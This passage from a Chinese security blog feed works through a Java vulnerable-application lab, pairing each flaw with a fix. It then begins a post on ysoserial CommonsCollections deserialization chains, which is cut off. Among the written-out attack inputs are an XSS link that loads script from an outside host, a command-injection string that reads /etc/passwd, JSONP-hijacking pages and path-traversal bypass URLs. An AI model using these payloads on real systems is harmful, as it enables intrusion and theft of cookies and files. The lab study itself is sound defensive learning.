src="https://i.loli.net/2020/04/16/avZXDQkmwhFnKfO.png" alt="Snipaste_2020-04-16_19-23-18.png"></p><h4><span id="sqli">SQLI</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/16/tSTcHpyA9bYF8NO.png" alt="Snipaste_2020-04-16_19-38-09.png"></p><p>直接将用户传入<code>的username</code>拼接入sql语句</p><p><strong>漏洞测试</strong></p><p><img src="https://i.loli.net/2020/04/16/vHSCbpOVAIaEt2n.png" alt="Snipaste_2020-04-16_19-43-21.png"></p><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/16/o7Gx5acw96pgH4O.png" alt="Snipaste_2020-04-16_19-45-16.png"></p><p>采用预编译的形式可以防止sql注入</p><hr><h4><span id="xss">XSS</span></h4><p><strong>漏洞代码</strong></p><p><strong>反射型xss</strong></p><p><img src="https://i.loli.net/2020/04/16/JcwWrLoEXaSnFUQ.png" alt="Snipaste_2020-04-16_19-56-43.png"></p><p>对于用户输入的参数没有过滤直接返回给前端，导致反射性xss，可以通过构造恶意链接诱导用户访问，从而获取cookie等扩大危害。</p><p><strong>存储型xss</strong></p><p><img src="https://i.loli.net/2020/04/16/ntLAr9U1fzKRWxs.png" alt="Snipaste_2020-04-16_21-40-26.png"></p><p>对于用户输入的参数没有过滤直接保存到cookie中，读取的时候也没有经过处理导致前端解析的时候导致xss</p><p><strong>漏洞测试</strong></p><p>恶意链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;xss&#x2F;reflect?xss&#x3D;%3CsCRiPt%20sRC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;uJSf%3E%3C&#x2F;sCrIpT%3E</span><br></pre></td></tr></table></figure><p>测试了一下，能接收到请求，但是读不到cookie，查看cookie发现设置了<code>httponly</code></p><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/16/OEbBFQf6dJ7WYL2.png" alt="Snipaste_2020-04-16_22-09-36.png"></p><p>将一些特殊字符html实体编码防止xss</p><hr><h4><span id="文件上传漏洞">文件上传漏洞</span></h4><p>没有提供漏洞代码，但是可以参考上传图片功能的检查举一反三。</p><p><strong>安全代码</strong></p><p>两个函数</p><p><img src="https://i.loli.net/2020/04/16/J1rPTZhly2HpkoU.png" alt="Snipaste_2020-04-16_23-04-01.png"></p><p><code>convert()</code>先写入一个临时文件，为之后的内容检查做准备，<code>isImage()</code>判断是否是图片格式</p><p><img src="https://i.loli.net/2020/04/16/ezA3UxvyWXmT1BD.png" alt="Snipaste_2020-04-16_22-55-11.png"></p><p>获取一些文件属性</p><p><img src="https://i.loli.net/2020/04/16/lazbcoHnIWAhPNG.png" alt="Snipaste_2020-04-16_22-55-30.png"></p><p>后缀名检查</p><p><img src="https://i.loli.net/2020/04/16/oyli8cPkvqwfFN9.png" alt="Snipaste_2020-04-16_22-56-02.png"></p><p>MIME类型检查（个人认为MIME的意义不大）</p><p><img src="https://i.loli.net/2020/04/16/gLZXd1sVpfm3C8Y.png" alt="Snipaste_2020-04-16_22-56-51.png"></p><p>图片内容检查</p><p><img src="https://i.loli.net/2020/04/16/lqycUxT25DXheF7.png" alt="Snipaste_2020-04-16_23-03-02.png"></p><p>最后上传文件后将临时文件删除。</p><h4><span id="ssti">SSTI</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/HtsUPc9ngGCaQLx.png" alt="Snipaste_2020-04-17_08-10-08.png"></p><p><strong>漏洞测试</strong></p><p><img src="https://i.loli.net/2020/04/17/Ns2C3xyGdEkeIHo.png" alt="Snipaste_2020-04-17_08-08-11.png"></p><p><strong>安全代码</strong></p><p><code>velocity.evaluate()</code>最新版本仍存在ssti，避免使用<code>velocity.evaluate()</code>方法</p><h4><span id="jsonp劫持">JSONP劫持</span></h4><p>用json来传数据，靠jsonp来跨域 </p><p><a href="https://drops.org.cn/PENETRATION/Json-with-Padding.html" target="_blank" rel="noopener">漏洞原理</a></p><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/rdine8WRzp1qIQN.png" alt="Snipaste_2020-04-17_09-25-04.png"></p><p>返回jsonp格式，注意这里的<code>this.callback=_callback</code>，当然这个例子即使param传错也能获取到数据</p><p><img src="https://i.loli.net/2020/04/17/PNO1BQEj57bwphl.png" alt="Snipaste_2020-04-17_09-42-49.png"></p><p>返回jsonp格式，没有处理referer为空的情况，并且空referer是可以被绕过的</p><p><img src="https://i.loli.net/2020/04/17/OkRcwqdBHgYWVMh.png" alt="Snipaste_2020-04-17_09-47-29.png"></p><p>返回Object(比如<code>JSONObject</code>或者<code>JavaBean</code>，但是不支持<code>Strin</code>g)，只要在参数中加入<code>callback=test</code>或<code>cback=test</code>就会自动变成jsonp接口。</p><p><img src="https://i.loli.net/2020/04/17/YkWt3bLfgpz7QGR.png" alt="Snipaste_2020-04-17_09-52-55.png"></p><p><code>CVE-2018-11040: Spring MappingJackson2JsonView</code>， 自动获取<code>jsonp</code>和<code>callback</code>参数使json数据自动转换成jsonp格式数据，支持跨域请求</p><p><strong>漏洞测试</strong></p><p>两种方式</p><p><code>ajax</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JavaScript"</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">$.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">url:<span class="string">'http://192.168.56.1:8080/vuln/emptyReferer'</span>,</span></span><br><span class="line"><span class="actionscript">dataType:<span class="string">'jsonp'</span>,</span></span><br><span class="line"><span class="actionscript">success:<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line">alert(data.name)</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;script&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line">alert(data.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://localhost:8080/jsonp/referer?callback</span>=<span class="string">test</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>空referer绕过</code></p><p>(为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer) </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"referrer"</span> <span class="attr">content</span>=<span class="string">"no-referrer"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line">alert(data.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://localhost:8080/jsonp/emptyReferer?callback</span>=<span class="string">test</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里<code>meta</code>标签中删除了<code>referer</code></p><p>靶场的有登录认证，因此就不继续测试了</p><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/17/JoPm5nRBgIw8d1e.png" alt="Snipaste_2020-04-17_10-39-58.png"></p><p><img src="https://i.loli.net/2020/04/17/tObuKrJIDln8gv2.png" alt="Snipaste_2020-04-17_10-41-55.png"></p><p><img src="https://i.loli.net/2020/04/17/4WF23CQABK7fzN5.png" alt="Snipaste_2020-04-17_10-42-05.png"></p><p><code>referer</code>为空也进行拦截</p><h4><span id="commandinject">CommandInject</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/Ny5ZjpSB6l84o7e.png" alt="Snipaste_2020-04-17_10-45-51.png"></p><p>没有对用户输入进行处理拼接进<code>cmdList</code>，命令执行</p><p><img src="https://i.loli.net/2020/04/17/hleZN6sbaqLrz3J.png" alt="Snipaste_2020-04-17_10-49-12.png"></p><p>和上面的类似</p><p><strong>漏洞测试</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host:127.0.0.1;cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/17/tCmENaVwGX2DPvM.png" alt="Snipaste_2020-04-17_11-15-06.png"></p><p><img src="https://i.loli.net/2020/04/17/moAvpud4iG1FK8x.png" alt="Snipaste_2020-04-17_11-15-49.png"></p><p><img src="https://i.loli.net/2020/04/17/WNZ1CvBwopGdxk3.png" alt="Snipaste_2020-04-17_11-18-48.png"></p><p>对传入的参数进行正则匹配，限制了字符集。</p><p>我感觉这个正则少了一个<code>\</code>，应该如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9_\&#x2F;\\.-]+$</span><br></pre></td></tr></table></figure><h4><span id="反序列化漏洞">反序列化漏洞</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/hoCuQvLi9OmGZ1k.png" alt="Snipaste_2020-04-17_11-31-49.png"></p><p><img src="https://i.loli.net/2020/04/17/8PrjLsCGMbqWXeu.png" alt="Snipaste_2020-04-17_11-49-51.png"></p><p>从cookie读取rememberMe字段对应的值，base64解密后进行反序列化，存在反序列化漏洞</p><p><strong>漏洞测试</strong></p><p>使用ysoserial生成CC5</p><p><img src="https://i.loli.net/2020/04/17/yQMJ42uEOX8aRkt.png" alt="Snipaste_2020-04-17_11-55-06.png"></p><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/17/HGXjPi2tzbKfBq1.png" alt="Snipaste_2020-04-17_11-55-59.png"></p><p><img src="https://i.loli.net/2020/04/17/WEj8IgtMJwOZPaz.png" alt="Snipaste_2020-04-17_12-02-18.png"></p><p><img src="https://i.loli.net/2020/04/17/A4udl81PxGVZ9Io.png" alt="Snipaste_2020-04-17_12-01-34.png"></p><p>项目中缓解的实现方法是写一个<code>ObjectInputStream</code>的子类，这个子类要重写<code>resolveClass()</code>，可以配置白名单或者黑名单。</p><p>Oracle最近引进<code>serialization filtering</code>来提高反序列化的安全性，它似乎结合了黑名单和白名单两种方式。新的反序列化过滤器被集成在JDK 9之中，这个特性已经被移植到更老的JDK之中了。<br>核心原理是，反序列化过滤基于<code>ObjectInputFilter</code>（ <a href="https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html</a> ）接口，这个接口提供一种配置能力 </p><h4><span id="fastjson漏洞">FastJson漏洞</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/9qmyEKwVhdbTLjB.png" alt="Snipaste_2020-04-17_12-10-04.png"></p><p>以fastjson1.2.24为例，<code>parseObject()</code>方法调用的时候加上<code>Feature.SupportNonPublicField</code>且payload用户可控</p><p><strong>安全代码</strong></p><p>升级fastjson，避免使用危险配置参数</p><h4><span id="路径穿越漏洞">路径穿越漏洞</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/Wqk4aVmLSvOuN7A.png" alt="Snipaste_2020-04-17_12-26-15.png"></p><p>没有对传入的文件路径进行检查</p><p><img src="https://i.loli.net/2020/04/17/d2r9BatS1bkR7Wg.png" alt="Snipaste_2020-04-17_12-26-45.png"></p><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/17/TM24o8KCBObdPNF.png" alt="Snipaste_2020-04-17_12-27-52.png"></p><p><img src="https://i.loli.net/2020/04/17/d6wqb8BxnouSKha.png" alt="Snipaste_2020-04-17_12-28-49.png"></p><p>先进行url解码，再设置<code>..</code>和<code>/</code>黑名单，防止路径穿越</p><h4><span id="getrequesturi">GetRequestURI</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/wFirZyX2DEHkWN1.png" alt="Snipaste_2020-04-17_14-52-57.png"></p><p>一些开发人员对静态目录会放行，检测是否包含<code>/css/</code>字符串，不包含才校验权限。可以权限绕过</p><p><strong>漏洞测试</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;%2e%2e&#x2F;uri&#x2F;exclued&#x2F;vuln</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;exclued&#x2F;vuln</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;bypasswaf&#x2F;exclued&#x2F;vuln</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/17/s4DhiLcaOykCFWj.png" alt="Snipaste_2020-04-17_14-53-52.png"></p><p><strong>安全代码</strong></p><p>将获取URI的方法换成<code>request.getServletPath();</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uri: &#x2F;css&#x2F;..&#x2F;hello    serlvetPath: &#x2F;hello</span><br><span class="line">uri: &#x2F;css&#x2F;%2e%2e&#x2F;hello    serlvetPath: &#x2F;hello</span><br></pre></td></tr></table></figure><h4><span id="ip伪造">IP伪造</span></h4><p><img src="https://i.loli.net/2020/04/17/DbKS1zXEBGni4QL.png" alt="Snipaste_2020-04-17_15-02-40.png"></p><p>用户可以伪造XFF头，因此ip不能从<code>X-Forwarded-For</code>获取</p><hr><h4><span id="spel">SpEL</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/uDNlgcKd6wm5haM.png" alt="Snipaste_2020-04-17_15-10-39.png"></p><p>使用了<code>SpelExpressionParser()</code>方法，SpEL解析，下面有个相关的漏洞</p><blockquote><p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">SpringBoot SpEL表达式注入漏洞</a></p></blockquote><p><strong>漏洞测试</strong></p><p><img src="https://i.loli.net/2020/04/17/XGbs3HK2VktUawv.png" alt="Snipaste_2020-04-17_15-15-44.png"></p><p><strong>安全代码</strong></p><p>使用<code>SimpleEvaluationContext()</code></p><h4><span id="xstreamrce">XStreamRce</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/dmVbQOPi4D3zI8v.png" alt="Snipaste_2020-04-17_15-16-15.png"></p><p>使用XStream来解析xml，版本<code>1.4.10 or &lt;=1.4.6</code></p><p>相关的还有比如<code>s2-052</code>，漏洞在于使用REST插件的XStream组件进行反序列化XML时没有任何过滤，导致攻击者可以构造恶意xml payload导致RCE。 </p><p><strong>漏洞测试</strong></p><p>因此当前项目更新了版本，之后可以单独分析下<code>XStream漏洞</code></p><p><strong>安全代码</strong></p><p>更新XStream版本</p><h4><span id="url重定向">URL重定向</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/LSl93onZPIRMw4W.png" alt="Snipaste_2020-04-17_15-38-43.png"></p><p><img src="https://i.loli.net/2020/04/17/76lpjtNH1gC8FnR.png" alt="Snipaste_2020-04-17_15-40-21.png"></p><p>上面是3种重定向的代码，但是由于没有对重定向的url进行检查，导致url重定向漏洞，跳转到一个攻击者控制的网站，可能导致跳转过去的用户被精心设置的钓鱼页面骗走自己的个人信息    和登录口令 。</p><p><strong>漏洞测试</strong></p><p>跳转到任意页面</p><p><strong>漏洞修复</strong></p><p><img src="https://i.loli.net/2020/04/17/qbe53o7kQp41BvX.png" alt="Snipaste_2020-04-17_15-44-55.png"></p><p><img src="https://i.loli.net/2020/04/17/5v3ibeJfCIFSsRE.png" alt="Snipaste_2020-04-17_15-46-52.png"></p><p><img src="https://i.loli.net/2020/04/17/25ipgXJv9fWNqCa.png" alt="Snipaste_2020-04-17_15-47-25.png"></p><p>设置白名单和黑名单校验</p><h4><span id="ssrf">SSRF</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/PJye8kzFMCfWX3I.png" alt="Snipaste_2020-04-17_15-53-52.png"></p><p><img src="https://i.loli.net/2020/04/17/h5GNtI47vFVcU9S.png" alt="Snipaste_2020-04-17_15-57-44.png"></p><p>相对于php，在java中SSRF的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。 </p><p><strong>漏洞测试</strong></p><p>读文件</p><p><img src="https://i.loli.net/2020/04/17/7wjmLtNqfzF8eAy.png" alt="Snipaste_2020-04-17_16-16-22.png"></p><p>还可以端口扫描</p><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/17/Tq4vabdyBhRGtIz.png" alt="Snipaste_2020-04-17_16-17-27.png"></p><p>首先限制了<code>http/https</code>协议，使用<code>ssrfHook()</code></p><p><img src="https://i.loli.net/2020/04/17/cmvGCogxUksZW2B.png" alt="Snipaste_2020-04-17_16-18-31.png"></p><p><img src="https://i.loli.net/2020/04/17/KDuYZwzsULd2INW.png" alt="Snipaste_2020-04-17_16-28-59.png"></p><p>跟进<code>initSocketImpl()</code></p><p><img src="https://i.loli.net/2020/04/17/AU1vOecfSJFiHs9.png" alt="Snipaste_2020-04-17_16-38-51.png"></p><p><img src="https://i.loli.net/2020/04/17/KDw1sekqQrjd5ag.png" alt="Snipaste_2020-04-17_16-39-36.png"></p><p><img src="https://i.loli.net/2020/04/17/bCmIWagrAhcPotj.png" alt="Snipaste_2020-04-17_16-40-10.png"></p><p>上面是一部分ssrf检查的代码，总体是从黑名单的角度来防止ssrf，现在一些业务也可以限制域名白名单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">从URL中获取host，限制为http&#x2F;https协议。只支持http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;，不支持&#x2F;&#x2F;的http协议。</span><br><span class="line">host转换为IP</span><br><span class="line">     * 会将各种进制的ip转为正常ip</span><br><span class="line">     * 167772161转换为10.0.0.1</span><br><span class="line">     * 127.0.0.1.xip.io转换为127.0.0.1</span><br><span class="line">使用SubnetUtils库判断ip是否在内网网段</span><br><span class="line">     *</span><br><span class="line">     * @param strIP ip字符串</span><br><span class="line">     * @return 如果是内网ip，返回true，否则返回false。</span><br><span class="line">判断一个URL的IP是否是内网IP</span><br><span class="line">解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。</span><br><span class="line">     * url只允许https或者http，并且设置默认连接超时时间。</span><br><span class="line">     * 该修复方案会主动请求重定向后的链接。最好用Hook方式获取到所有url后，进行判断</span><br></pre></td></tr></table></figure><h4><span id="xxe">XXE</span></h4><p><strong>漏洞代码</strong></p><p><img src="https://i.loli.net/2020/04/17/awOIF8qu6XJxLz7.png" alt="Snipaste_2020-04-17_16-45-22.png"></p><p><img src="https://i.loli.net/2020/04/17/u2hKDpBiXCmnGF7.png" alt="Snipaste_2020-04-17_16-46-18.png"></p><p><img src="https://i.loli.net/2020/04/17/1ds9DaNuonByItq.png" alt="Snipaste_2020-04-17_16-46-54.png"></p><p><img src="https://i.loli.net/2020/04/17/39lYEVPHnAS8bN2.png" alt="Snipaste_2020-04-17_16-47-08.png"></p><p><img src="https://i.loli.net/2020/04/17/6iT4ebqNMVL2Hk7.png" alt="Snipaste_2020-04-17_16-47-18.png"></p><p>解析xml的对象没有正确配置导致XXE</p><p><strong>安全代码</strong></p><p><img src="https://i.loli.net/2020/04/17/Qr9ymMRl872ifpK.png" alt="Snipaste_2020-04-17_16-45-58.png"></p><p>后面几个也差不多，正确配置可以防止XXE。</p><h4><span id="总结">总结</span></h4><p>这个项目看的比较快，主要是一些java可能出现的基础漏洞，不过在学习的过程中找到一些好文章。</p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial-CommonsCollections系列学习</title>
    <link href="https://glotozz.github.io/2020/04/14/ysoserial-CommonsCollections%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/"/>
    <id>https://glotozz.github.io/2020/04/14/ysoserial-CommonsCollections%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-14T03:06:33.000Z</published>
    <updated>2020-04-18T04:34:38.223Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#简单介绍">简单介绍</a></li><li><a href="#预备知识">预备知识</a></li><li><a href="#commonscollections1">CommonsCollections1</a></li><li><a href="#commonscollections2">CommonsCollections2</a></li><li><a href="#commonscollections3">CommonsCollections3</a></li><li><a href="#参考链接">参考链接</a></li></ul><!-- tocstop --><hr><p>之前分析过ysoserial-<code>CommonsCollections5</code>这条链，这里学习下其他的思路</p><h4><span id="简单介绍">简单介绍</span></h4><blockquote><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p><p>一些Java应用程序(Weblogic，Websphere，Jboss，Jenkins，Coldfusion等)的RCE漏洞都是因为Commons-Collections的反序列化造成的。</p></blockquote><h4><span id="预备知识">预备知识</span></h4><p><strong>动态代理</strong></p><p>在不修改类的源码的情况下，通过代理的方式为类的方法提供更多的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Throwable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>demo</strong></p><p><code>Do接口</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Do</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doSome</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>People类</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span> <span class="keyword">implements</span> <span class="title">Do</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doSome</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"gqy"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DoHandler类</code>用来处理被代理对象，它必须继承<code>InvocationHandler</code>接口，并实现<code>invoke()</code>方法 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DoHandler</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">//在真实的对象执行之前我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">"before invoke。。。"</span>);</span><br><span class="line">        <span class="comment">//java的反射功能，用来调用obj对象的method方法，传入参数为args</span></span><br><span class="line">        Object invoke = method.invoke(proxy, args);</span><br><span class="line">        <span class="keyword">return</span> invoke;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        People people = <span class="keyword">new</span> People();</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> 